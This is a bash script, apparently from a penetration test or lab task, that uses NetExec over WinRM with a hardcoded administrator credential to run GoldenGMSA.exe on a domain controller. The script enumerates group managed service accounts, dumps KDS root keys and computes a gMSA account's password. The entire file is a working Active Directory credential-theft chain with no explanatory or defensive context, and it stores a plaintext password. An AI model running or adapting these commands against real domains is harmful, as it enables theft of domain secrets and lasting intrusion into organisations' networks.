#!/bin/bash
# T024 — GoldenGMSA correct verb chain on DC01 (as chief_command)
NXC=/tmp/nxc-venv/bin/nxc
DC1=192.168.77.10
G='C:\Windows\Temp\cadre-tools\GoldenGMSA.exe'

echo "=== gmsainfo (gMSA enumeration) ==="
$NXC winrm "$DC1" -d cadre.local -u chief_command -p 'C0mm@nd_Ch1ef!' -X "& $G gmsainfo /domain:cadre.local /dc:dc01.cadre.local" 2>&1 | tail -15

echo "=== kdsinfo (KDS root keys) ==="
$NXC winrm "$DC1" -d cadre.local -u chief_command -p 'C0mm@nd_Ch1ef!' -X "& $G kdsinfo /domain:cadre.local /dc:dc01.cadre.local" 2>&1 | tail -15

echo "=== compute (gmsaTools password) ==="
$NXC winrm "$DC1" -d cadre.local -u chief_command -p 'C0mm@nd_Ch1ef!' -X "& $G compute /domain:cadre.local /dc:dc01.cadre.local /account:gmsaTools$" 2>&1 | tail -15

echo "=== T024-DONE ==="
